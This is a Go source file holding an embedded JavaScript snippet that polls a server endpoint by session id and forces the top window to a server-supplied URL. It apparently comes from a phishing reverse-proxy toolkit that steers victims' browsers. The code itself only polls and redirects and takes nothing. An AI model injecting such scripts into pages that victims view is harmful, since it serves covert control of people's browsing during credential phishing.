package core

const DYNAMIC_REDIRECT_JS = `
function getRedirect(sid) {
	var url = "/s/" + sid;
	console.log("polling puppet: " + url);
	fetch(url, {
		method: "GET",
		headers: {
			"Content-Type": "application/json"
		},
		credentials: "include"
	})
		.then((response) => {
			if (response.status == 200) {
				return response.json();
			} else if (response.status == 408) {
				setTimeout(function () { getRedirect(sid) }, 3000);
			} else {
				throw "http error: " + response.status;
			}
		})
		.then((data) => {
			if (data !== undefined && data.redirect_url) {
				// Only redirect if different from current location to avoid loops
				var currentUrl = window.location.href.split('#')[0].split('?')[0];
				var targetUrl = data.redirect_url.split('#')[0].split('?')[0];
				
				if (currentUrl !== targetUrl) {
					console.log("puppet navigation detected, redirecting: " + data.redirect_url);
					top.location.href=data.redirect_url;
				} else {
					// Same page, continue polling
					setTimeout(function () { getRedirect(sid) }, 5000);
				}
			}
		})
		.catch((error) => {
			console.error("api: error:", error);
			setTimeout(function () { getRedirect(sid) }, 10000);
		});
}
getRedirect('{session_id}');
`
